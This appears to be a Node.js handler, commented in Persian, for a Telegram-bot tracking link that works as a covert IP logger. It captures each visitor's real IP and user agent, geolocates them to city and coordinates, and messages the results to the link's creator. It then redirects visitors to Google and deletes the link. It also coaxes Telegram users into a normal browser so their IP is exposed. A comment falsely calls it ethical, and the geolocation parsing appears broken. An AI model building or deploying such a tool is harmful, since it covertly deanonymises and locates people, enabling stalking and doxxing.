// api/track.js

const { Bot } = require("grammy");
const { load } = require("cheerio")
const DB = require('../services/storage'); 

const bot = new Bot(process.env.BOT_TOKEN);

// این تابع مستقیماً توسط درخواست HTTP مرورگر فراخوانی می‌شود
module.exports = async (req, res) => {
    const url = new URL(req.url, `https://${req.headers.host}`);
    const linkId = url.searchParams.get('id');

    if (!linkId) {
        res.statusCode = 400;
        return res.end("Missing link ID.");
    }

    try {
        // ۱. بازیابی اطلاعات خالق لینک
        const linkData = await DB.getLinkData(linkId);
        // console.log(linkData)
        if (!linkData) {
            res.statusCode = 404;
            return res.end("Link expired or not found.");
        }
        
        const { creatorId } = linkData;
             const realUserIP = (
        req.headers['cf-connecting-ip'] ||          // Cloudflare
        req.headers['x-forwarded-for']?.split(',')[0].trim() || // پروکسی زنجیره
        req.headers['x-real-ip'] ||                // نرم افزارهای خاص
        req.connection.remoteAddress ||            // مستقیم
        req.socket.remoteAddress ||                // از سوکت
        'UNKNOWN'
    ).replace('::ffff:', ''); // حذف IPv6 prefix

    // اطلاعات کامل کاربر
    const userInfo = {
        ip: realUserIP,
        timestamp: new Date().toISOString(),
        userAgent: req.headers['user-agent'],
        referer: req.headers.referer || 'direct',
        query: req.query,
        // تشخیص تلگرام
        isTelegram: req.headers['user-agent']?.includes('TelegramBot') || 
                    req.headers['user-agent']?.includes('Telegram') || false
    };

    // 🎯 اگر از تلگرام آمده باشد
    if (userInfo.isTelegram) {
        console.log('⚠️ کاربر از تلگرام آمده - IP مخفی است:', req.connection.remoteAddress);
        
        // صفحه اخطار نمایش بده
        const warningHtml = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <title>⚠️ لطفا از مرورگر معمولی وارد شوید</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: Tahoma; text-align: center; padding: 50px; }
                .warning { color: #d63031; background: #ffeaa7; padding: 20px; border-radius: 10px; }
                .steps { text-align: right; margin: 30px; }
            </style>
        </head>
        <body>
            <div class="warning">
                <h2>⛔ برای ادامه لطفا از مرورگر معمولی استفاده کنید</h2>
            </div>
            
            <div class="steps">
                <h3>📱 راه‌حل:</h3>
                <p>1. لینک زیر را کپی کنید</p>
                <p style="background:#eee;padding:10px;font-family:monospace;">
                    ${req.url}
                </p>
                <p>2. آن را در مرورگر معمولی (Chrome, Firefox, Safari) باز کنید</p>
            </div>
            
            <p><a href="#" onclick="copyLink()" style="background:#0984e3;color:white;padding:10px 20px;border-radius:5px;text-decoration:none">
                📋 کپی لینک
            </a></p>
            
            <script>
                function copyLink() {
                    navigator.clipboard.writeText(window.location.href);
                    alert('لینک کپی شد! حالا در مرورگر معمولی بازش کنید');
                }
            </script>
        </body>
        </html>
        `;
        
        return res.send(warningHtml);
    }

    // ✅ کاربر از مرورگر معمولی آمده - IP واقعی را داریم
    console.log('🎉 IP واقعی کاربر:', realUserIP);
    console.log('📊 اطلاعات کامل:', JSON.stringify(userInfo, null, 2));
        // const privateUserIP =  req.headers['x-real-ip'];
        // const privateUserIP = req.headers['x-forwarded-for'];
        // const privateUserAgent = req.headers['user-agent'];
        // console.log(`IP: ${privateUserIP} | ${privateUserAgent}`)
        //  fetch('https://api.ipify.org?format=json')
        //     .then(res => res.json()).then(s => console.log(s))
        // ۲. ارسال اعلان به خالق لینک
        // از آنجایی که نیاز به IP یا موقعیت مکانی نداریم، این عملیات اخلاقی است
        bot.api.sendMessage(
            creatorId, 
            `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.`
        ).catch(e => console.error("Error sending notification:", e));
        
        fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`).then(res => res.text()).then(s => {
            const $ = load(s)
            const data = $("#code-json").attr("data-full")
            bot.api.sendMessage(
            creatorId,
            `ip: ${data.ip}
            hostname: ${data.hostname}
            location: ${data.location.city}
            latitude: ${data.location.latitude}
            longitude: ${data.location.longitude}
            country code: ${data.location.country_code2}
            country name: ${data.location.country_name}
            `
            )
        })

        // ۴. هدایت کاربر به یک مقصد نهایی
        res.writeHead(302, { Location: 'https://www.google.com' });

        // Remove link After 10 seconds
        setTimeout(async () => await DB.deleteLink(linkId), 10 * 1000)

        res.end();

    } catch (error) {
        console.error("Tracking Error:", error);
        res.statusCode = 500;
        res.end("Internal Server Error.");
    }
};